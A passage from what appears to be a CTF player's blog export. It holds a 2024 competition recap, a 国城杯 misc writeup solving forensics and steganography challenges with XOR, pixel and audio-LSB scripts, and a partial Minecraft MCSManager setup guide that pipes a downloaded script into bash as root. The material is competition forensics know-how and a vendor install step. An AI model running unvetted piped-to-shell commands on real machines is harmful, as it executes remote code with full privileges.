title="强网杯初赛"></a>强网杯初赛</h3><p>wp: <a href="https://www.blog.st4rr.top/2024/11/05/%E5%BC%BA%E7%BD%91%E6%9D%AF2024-Misc-%E8%B0%8D%E5%BD%B1%E9%87%8D%E9%87%8D5-0-Writeup/">点我</a></p><p>跟星盟预备队打的，贡献了一个misc，另有一个misc是跟aura爷一起做的，aura贡献比较大，我就没写wp<del>（我懒）</del></p><p>又见识到了新题型:)</p><p>这次排名是第60名，对预备队来说其实挺不错的，可惜还是未晋级</p><h3 id="网鼎杯初赛"><a href="#网鼎杯初赛" class="headerlink" title="网鼎杯初赛"></a>网鼎杯初赛</h3><p>跟星盟预备队报的玄武组，你猜这里我为什么没放wp，诶，我爆零了</p><p>:(</p><p>其实这把我应该跟校队报青龙组的，听说挺容易晋级的。而玄武组是人数多，晋级名额又少。</p><p>:(</p><h3 id="美亚杯线下赛"><a href="#美亚杯线下赛" class="headerlink" title="美亚杯线下赛"></a>美亚杯线下赛</h3><p>跟校队的1n1t和w8nn9z师傅一起去厦门打了美亚杯的线下赛。</p><p>然而我太菜了，个人资格赛环节就被淘汰了:( 总结一下原因，我做题速度太慢了，而且准备不充分，当时对手机取证还是过于生疏所以浪费了大量的时间。</p><p>幸亏另外两位师傅比较给力，仅凭两个人在团体赛中还是拿了个三等奖Orz</p><p>明年再来，一雪前耻。</p><img src="/images/2024年度总结/IMG_4636.JPG" alt="IMG_4636" style="zoom:25%;" /><img src="/images/2024年度总结/IMG_4634.JPG" alt="IMG_4634" style="zoom: 50%;" /><p><img src="/images/2024%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/7D8B5131-79D1-4DA6-BB91-54B63C523B1E-2027-0000010.jpg" alt="7D8B5131-79D1-4DA6-BB91-54B63C523B1E-2027-0000010"></p><h3 id="极客大挑战"><a href="#极客大挑战" class="headerlink" title="极客大挑战"></a>极客大挑战</h3><p>wp: <a href="https://www.blog.st4rr.top/2024/11/19/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982024-Writeup/">点我</a></p><p>跟w8nn9z一起组队打了极客大挑战，打爽了，拿了个三等奖</p><p>题挺不错的，又学到了</p><p><img src="/images/2024%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/image-20250122175410977.png" alt="image-20250122175410977"></p><h3 id="升入星盟主队Polaris"><a href="#升入星盟主队Polaris" class="headerlink" title="升入星盟主队Polaris"></a>升入星盟主队Polaris</h3><p>根据星盟的考核标准，我尝试申请了升队。</p><p>经过考核，没想到真的成功了，就此加入了星盟主队，成为了正式成员。</p><p><del>也许是星盟对misc手还是比较缺吧</del></p><h2 id="12月"><a href="#12月" class="headerlink" title="12月"></a>12月</h2><h3 id="吾杯"><a href="#吾杯" class="headerlink" title="吾杯"></a>吾杯</h3><p>wp: <a href="https://www.blog.st4rr.top/2024/12/05/%E5%90%BE%E6%9D%AF2024-Writeup/">点我</a></p><p>个人赛，打着玩玩</p><p>给的获奖名额特别多，拿了个二等奖</p><p>![屏幕截图 2025-01-22 172551](&#x2F;images&#x2F;2024年度总结&#x2F;屏幕截图 2025-01-22 172551.png)</p><h3 id="国城杯初赛"><a href="#国城杯初赛" class="headerlink" title="国城杯初赛"></a>国城杯初赛</h3><p>wp: <a href="https://www.blog.st4rr.top/2024/12/07/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024-Writeup/">点我</a></p><p>跟校队的几位师傅一起打的，这时候我们有了密码手。</p><p>这个比赛的难度还可以，比较适合我们食用。但可惜的是，这个比赛的pwn从解题人数来看应该都不难，加上这几题的分我们完全可以晋级，而我们缺的就是pwn手。。。因此，我们又与晋级失之交臂。</p><p>有两个misc没做出来，复现了，学到了。</p><h3 id="cn-fnst"><a href="#cn-fnst" class="headerlink" title="cn-fnst"></a>cn-fnst</h3><p>wp: <a href="https://www.blog.st4rr.top/2024/12/15/cn-fnst2024-Writeup/">点我</a></p><p>跟两个小登一起打的cn-fnst，我做了个占分比较高的题直接给干到第三名了，拿了个二等奖</p><img src="/images/2024年度总结/龙鳞小队.png" alt="龙鳞小队" style="zoom: 25%;" /><p><del>不是你奖我个这个(?</del></p><img src="/images/2024年度总结/IMG_5418.JPG" alt="IMG_5418" style="zoom:25%;" /><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>写完上面的年度报告，突然感觉自己初入网安这一年的进步具象化起来，很高兴能看到自己逐步踏入网安的门槛。</p><p>不过宏观来看，我仍然只是个网安萌新，我看到的甚至还不到冰山的一角。我仍然需要不断地学习进步，磨练自己的技术。</p><p>未来的一年，希望我能够拿到一些大比赛的奖，在比赛中多做出一点贡献。另外，感觉光打misc对于网安来说是远远不够的，我必须再学一门其他方向，目前暂定web吧，想学点具有实战意义的东西。</p><p>下面再贴一张我在交星盟年报时做的个人技能树吧。</p><img src="/images/2024年度总结/2024年度总结.jpg" alt="2024年度总结" style="zoom: 25%;" />]]></content>
      
      
      <categories>
          
          <category> Life </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 年度总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cn-fnst2024 Writeup</title>
      <link href="/2024/12/15/cn-fnst2024-Writeup/"/>
      <url>/2024/12/15/cn-fnst2024-Writeup/</url>
      
        <content type="html"><![CDATA[<blockquote><p><del>小登们带我飞</del></p></blockquote><p><a href="https://www.blog.st4rr.top/writeups/cn-fnst2024Writeup.pdf">Wrtieup</a></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> cn-fnst </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>国城杯2024 Writeup</title>
      <link href="/2024/12/07/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024-Writeup/"/>
      <url>/2024/12/07/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024-Writeup/</url>
      
        <content type="html"><![CDATA[<blockquote><p>这次跟校队的几位同届的大师傅一起打的，师傅们都很强，又是被师傅们带着冲的一集。可惜我们缺个pwn手，这次的pwn从解题人数来看应该不难，但是我们一题都没做。。。</p></blockquote><h2 id="Writeup部分"><a href="#Writeup部分" class="headerlink" title="Writeup部分"></a>Writeup部分</h2><h4 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a><a href="https://www.blog.st4rr.top/writeups/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024Writeup.pdf">Writeup</a></h4><h2 id="复现部分"><a href="#复现部分" class="headerlink" title="复现部分"></a>复现部分</h2><blockquote><p>不懂的还是太多了，好好复现一下吧。</p></blockquote><h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="Just-F0r3n51Cs"><a href="#Just-F0r3n51Cs" class="headerlink" title="Just_F0r3n51Cs"></a>Just_F0r3n51Cs</h4><blockquote><p>这题当时是找到了第三第四个flag，第一个flag找到了密钥但是没找到密文。</p></blockquote><h5 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h5><p>在桌面上可以找到beginning.pcapng</p><p><img src="/images/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024-Writeup/image-20241207185904257.png" alt="image-20241207185904257"></p><p>追踪一下http流可以看到传输了一张jpg图片，保存下来</p><p><img src="/images/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024-Writeup/image-20241207190018698.png" alt="image-20241207190018698"></p><p>图片结尾有一串base64</p><p><img src="/images/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024-Writeup/image-20241207190302519.png" alt="image-20241207190302519"></p><p>解出来提示oursecret，用oursecret提取得到hidden.txt</p><p><img src="/images/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024-Writeup/image-20241207190353388.png" alt="image-20241207190353388"></p><p><img src="/images/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024-Writeup/image-20241207190505330.png" alt="image-20241207190505330"></p><p>内容如下</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ECB&#x27;s key is</span><br><span class="line">N11c3TrYY6666111</span><br><span class="line">记得给我秋秋空间点赞</span><br></pre></td></tr></table></figure><p>查看流量包中的oicq流，可以看到一个QQ号</p><p><img src="/images/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024-Writeup/image-20241207190631379.png" alt="image-20241207190631379"></p><p>看一下其空间，找到密文</p><img src="/images/国城杯2024-Writeup/FEFD121B2F9676AB28DFE7834E11BB28.png" alt="FEFD121B2F9676AB28DFE7834E11BB28" style="zoom:50%;" /><p><img src="/images/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024-Writeup/image-20241207190927635.png" alt="image-20241207190927635"></p><h5 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h5><p>找到SYSTEM，右键解析注册表</p><p><img src="/images/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024-Writeup/image-20241207191051755.png" alt="image-20241207191051755"></p><p>查看环境变量，找到第二个flag存放的路径，前往将其导出</p><p><img src="/images/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024-Writeup/image-20241207191309431.png" alt="image-20241207191309431"></p><p>文件名字叫2，但是从特征不难发现这是个压缩包，有注释。</p><p><img src="/images/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024-Writeup/image-20241207191511072.png" alt="image-20241207191511072"></p><p>根据要求找到相关信息，得到密码D0g3xGC_Windows_7_Ultimate_115.0</p><p><img src="/images/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024-Writeup/image-20241207192038615.png" alt="image-20241207192038615"></p><p><img src="/images/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024-Writeup/image-20241207192104491.png" alt="image-20241207192104491"></p><p>base85</p><p><img src="/images/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024-Writeup/image-20241207192304255.png" alt="image-20241207192304255"></p><h5 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h5><p>不难找到original.zip，到处都是它的痕迹。同时在图片文件夹下可以找到一张特殊的图片。</p><p><img src="/images/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024-Writeup/image-20241207192522212.png" alt="image-20241207192522212"></p><p>压缩包有注释</p><p><img src="/images/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024-Writeup/image-20241207192609657.png" alt="image-20241207192609657"></p><p>根据要求找到相关信息，得到密码qwe123!@#_Y0u_f1Nd^_^m3_233</p><p><img src="/images/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024-Writeup/image-20241207192723500.png" alt="image-20241207192723500"></p><p><img src="/images/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024-Writeup/image-20241207192801229.png" alt="image-20241207192801229"></p><p><img src="/images/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024-Writeup/image-20241207192901376.png" alt="image-20241207192901376"></p><p>根据水印图片的名字CatWaterMark_666.png可知，用github上的<a href="https://github.com/Konano/CatWatermark">这个工具</a>提取盲水印，参数为666</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python decode.py Original.png CatWaterMark_666.png output.png 6 6 6</span><br></pre></td></tr></table></figure><p><img src="/images/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024-Writeup/image-20241207193442527.png" alt="image-20241207193442527"></p><h5 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h5><p>不难找到flag4.zip，到处都是它的痕迹。</p><p><img src="/images/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024-Writeup/image-20241207193653243.png" alt="image-20241207193653243"></p><p>flag4.zip里面有个python打包的exe和一个加密的bin文件，python逆向一下</p><p><img src="/images/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024-Writeup/image-20241207194149584.png" alt="image-20241207194149584"></p><p><img src="/images/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024-Writeup/image-20241207194230130.png" alt="image-20241207194230130"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># uncompyle6 version 3.9.1</span></span><br><span class="line"><span class="comment"># Python bytecode version base 3.8.0 (3413)</span></span><br><span class="line"><span class="comment"># Decompiled from: Python 3.10.11 (tags/v3.10.11:7d4cc5a, Apr  5 2023, 00:38:17) [MSC v.1929 64 bit (AMD64)]</span></span><br><span class="line"><span class="comment"># Embedded file name: enc_png.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor_encrypt</span>(<span class="params">data, key</span>):</span><br><span class="line">    encrypted_data = <span class="built_in">bytearray</span>()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">        encrypted_data.append(data[i] ^ key[i % <span class="built_in">len</span>(key)])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> encrypted_data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_file</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        data = file.read()</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_file</span>(<span class="params">file_path, data</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        file.write(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_file</span>(<span class="params">input_file_path, output_file_path, key</span>):</span><br><span class="line">    data = read_file(input_file_path)</span><br><span class="line">    encrypted_data = xor_encrypt(data, key)</span><br><span class="line">    write_file(output_file_path, encrypted_data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    key = <span class="string">b&#x27;GCcup_wAngwaNg!!&#x27;</span></span><br><span class="line">    input_file = <span class="string">&quot;flag4.png&quot;</span></span><br><span class="line">    encrypted_file = <span class="string">&quot;flag4_encrypted.bin&quot;</span></span><br><span class="line">    encrypt_file(input_file, encrypted_file, key)</span><br><span class="line"></span><br><span class="line"><span class="comment"># okay decompiling enc_png.pyc</span></span><br></pre></td></tr></table></figure><p>什么都不用改就能解密：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">xor_decrypt</span>(<span class="params">data, key</span>):</span><br><span class="line">    encrypted_data = <span class="built_in">bytearray</span>()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">        encrypted_data.append(data[i] ^ key[i % <span class="built_in">len</span>(key)])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> encrypted_data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_file</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        data = file.read()</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_file</span>(<span class="params">file_path, data</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        file.write(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_file</span>(<span class="params">input_file_path, output_file_path, key</span>):</span><br><span class="line">    data = read_file(input_file_path)</span><br><span class="line">    decrypted_data = xor_decrypt(data, key)</span><br><span class="line">    write_file(output_file_path, decrypted_data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    key = <span class="string">b&#x27;GCcup_wAngwaNg!!&#x27;</span></span><br><span class="line">    input_file = <span class="string">&quot;flag4_encrypted.bin&quot;</span></span><br><span class="line">    decrypted_file = <span class="string">&quot;flag4.png&quot;</span></span><br><span class="line">    decrypt_file(input_file, decrypted_file, key)</span><br></pre></td></tr></table></figure><p>flag4.png:</p><p><img src="/images/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024-Writeup/asynccode" alt="img"></p><p>合起来</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D0g3xGC&#123;Y0u_h4V3_f0und_7H3_F1N4L_s3CR3t_0F_Th15_F0R3N51c5_Ch4Ll3N93&#125;</span><br></pre></td></tr></table></figure><h4 id="eZ-Steg0"><a href="#eZ-Steg0" class="headerlink" title="eZ_Steg0"></a>eZ_Steg0</h4><p>图片名叫01.png，写个python脚本遍历每个像素，黑色记为0，白色记为1，输出二进制字符串</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">image_to_binary_string</span>(<span class="params">image_path, threshold=<span class="number">127</span></span>):</span><br><span class="line">    <span class="keyword">with</span> Image.<span class="built_in">open</span>(image_path) <span class="keyword">as</span> img:</span><br><span class="line">        img = img.convert(<span class="string">&#x27;L&#x27;</span>)</span><br><span class="line">        binary_string = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(img.height):</span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(img.width):</span><br><span class="line">                pixel_value = img.getpixel((x, y))</span><br><span class="line">                <span class="keyword">if</span> pixel_value &lt; threshold:</span><br><span class="line">                    binary_string += <span class="string">&quot;0&quot;</span> </span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    binary_string += <span class="string">&quot;1&quot;</span> </span><br><span class="line">    <span class="keyword">return</span> binary_string.strip() </span><br><span class="line">image_path = <span class="string">&#x27;01.png&#x27;</span> </span><br><span class="line">result_string = image_to_binary_string(image_path)</span><br><span class="line"><span class="built_in">print</span>(result_string)</span><br></pre></td></tr></table></figure><p>cyberchef转换一下，删去一些0以后发现结尾有倒着的png头</p><p><img src="/images/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024-Writeup/image-20241209184653844.png" alt="image-20241209184653844"></p><p>处理一下保存为png</p><p><img src="/images/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024-Writeup/image-20241209184747610.png" alt="image-20241209184747610"></p><p><img src="/images/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024-Writeup/image-20241209185016483.png" alt="image-20241209185016483"></p><p>这就是key.zip的密码。解压得到的key开头有段base64</p><p><img src="/images/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024-Writeup/image-20241209185254500.png" alt="image-20241209185254500"></p><p><img src="/images/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024-Writeup/image-20241209185317446.png" alt="image-20241209185317446"></p><p>提示了这是一个stl文件，删去开头的base64，修改后缀名为.stl，用<a href="https://www.3dpea.com/cn/view-STL-online">这个网站</a>查看，即可看到key</p><p><img src="/images/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024-Writeup/image-20241209185656525.png" alt="image-20241209185656525"></p><p>用这个key去对不知道是什么东西的flag文件异或一下，可以得到一个wav文件</p><p><img src="/images/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024-Writeup/image-20241209185954584.png" alt="image-20241209185954584"></p><p>提取<a href="https://sumit-arora.medium.com/audio-steganography-the-art-of-hiding-secrets-within-earshot-part-2-of-2-c76b1be719b3">音频lsb隐写</a>，得到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> wave</span><br><span class="line">song = wave.<span class="built_in">open</span>(<span class="string">&quot;download.wav&quot;</span>, mode=<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line"><span class="comment"># Convert audio to byte array</span></span><br><span class="line">frame_bytes = <span class="built_in">bytearray</span>(<span class="built_in">list</span>(song.readframes(song.getnframes())))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Extract the LSB of each byte</span></span><br><span class="line">extracted = [frame_bytes[i] &amp; <span class="number">1</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(frame_bytes))]</span><br><span class="line"><span class="comment"># Convert byte array back to string</span></span><br><span class="line">string = <span class="string">&quot;&quot;</span>.join(<span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="string">&quot;&quot;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>,extracted[i:i+<span class="number">8</span>])),<span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(extracted),<span class="number">8</span>))</span><br><span class="line"><span class="comment"># Cut off at the filler characters</span></span><br><span class="line">decoded = string.split(<span class="string">&quot;###&quot;</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Print the extracted text</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Sucessfully decoded: &quot;</span>+decoded)</span><br><span class="line">song.close()</span><br></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D0g3xGC&#123;U_4rE_4_WhI2_4t_Ste9An09r4pHY&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> 国城杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MC服务器搭建</title>
      <link href="/2024/12/05/MC%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA/"/>
      <url>/2024/12/05/MC%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<blockquote><p>记录一下我唯一玩、最热爱的游戏MC服务器的搭建，这里使用的是MCSManager</p><p>随着使用的深入，后续会添加更多</p></blockquote><p>这里使用到的：一台带有公网ip的ubuntu22.04-x64系统服务器、<a href="https://github.com/MCSManager/MCSManager">MCSManager面板</a>，我们要安装的是java1.21.4-Fabric版本</p><h2 id="预操作"><a href="#预操作" class="headerlink" title="预操作"></a>预操作</h2><p>先进行一些经典操作</p><h3 id="更新软件源"><a href="#更新软件源" class="headerlink" title="更新软件源"></a>更新软件源</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt update</span><br></pre></td></tr></table></figure><h3 id="开放端口"><a href="#开放端口" class="headerlink" title="开放端口"></a>开放端口</h3><p>启动防火墙，开放端口，下面我们会用到的是23333、24444和25565端口，特别要注意的是别忘了开放自己ssh所用的端口，这里我使用的是49578端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ufw <span class="built_in">enable</span></span><br><span class="line">ufw allow 23333/tcp 24444/tcp 25565/tcp 49578/tcp</span><br><span class="line">ufw status         <span class="comment">#检查已开放端口</span></span><br></pre></td></tr></table></figure><h2 id="安装java"><a href="#安装java" class="headerlink" title="安装java"></a>安装java</h2><p>由于我们要安装的是1.21.4版，因此需要安装对应的java21的环境</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt install openjdk-21-jdk</span><br><span class="line">java -version      <span class="comment">#检查是否安装成功</span></span><br></pre></td></tr></table></figure><h2 id="面板安装"><a href="#面板安装" class="headerlink" title="面板安装"></a>面板安装</h2><h3 id="一键安装"><a href="#一键安装" class="headerlink" title="一键安装"></a>一键安装</h3><p>官方给出的一键安装方法（实测国内服务器可用）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo su -c <span class="string">&quot;wget -qO- https://script.mcsmanager.com/setup.sh | bash&quot;</span></span><br></pre></td></tr></table></figure><p><img src="/images/MC%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA/image-20241205194127608.png" alt="image-20241205194127608"></p><h3 id="手动安装"><a href="#手动安装" class="headerlink" title="手动安装"></a>手动安装</h3><p>官方给出的手动安装方法（没测过）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Create /opt directory if not already</span></span><br><span class="line"><span class="built_in">mkdir</span> /opt</span><br><span class="line"><span class="comment"># Switch to /opt</span></span><br><span class="line"><span class="built_in">cd</span> /opt/</span><br><span class="line"><span class="comment"># Download Node.js 20.11. If you already have Node.js 16+ installed, ignore this step.</span></span><br><span class="line">wget https://nodejs.org/dist/v20.11.0/node-v20.11.0-linux-x64.tar.xz</span><br><span class="line"><span class="comment"># Decompress Node.js source</span></span><br><span class="line">tar -xvf node-v20.11.0-linux-x64.tar.xz</span><br><span class="line"><span class="comment"># Add Node.js to system PATH</span></span><br><span class="line"><span class="built_in">ln</span> -s /opt/node-v20.11.0-linux-x64/bin/node /usr/bin/node</span><br><span class="line"><span class="built_in">ln</span> -s /opt/node-v20.11.0-linux-x64/bin/npm /usr/bin/npm</span><br><span class="line"></span><br><span class="line"><span class="comment"># Prepare MCSM&#x27;s installation directory</span></span><br><span class="line"><span class="built_in">mkdir</span> /opt/mcsmanager/</span><br><span class="line"><span class="built_in">cd</span> /opt/mcsmanager/</span><br><span class="line"></span><br><span class="line"><span class="comment"># Download MCSManager</span></span><br><span class="line">wget https://github.com/MCSManager/MCSManager/releases/latest/download/mcsmanager_linux_release.tar.gz</span><br><span class="line">tar -zxf mcsmanager_linux_release.tar.gz</span><br><span class="line"></span><br><span class="line"><span class="comment"># Install dependencies</span></span><br><span class="line">./install.sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># Please open two terminals or screens.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Start the daemon first.</span></span><br><span class="line">./start-daemon.sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># Start the web interface at the second terminal or screen.</span></span><br><span class="line">./start-web.sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># For web access, go to http://localhost:23333/</span></span><br><span class="line"><span class="comment"># In general, the web interface will automatically scan and add the local daemon.</span></span><br></pre></td></tr></table></figure><p>MCSM的启动和暂停</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 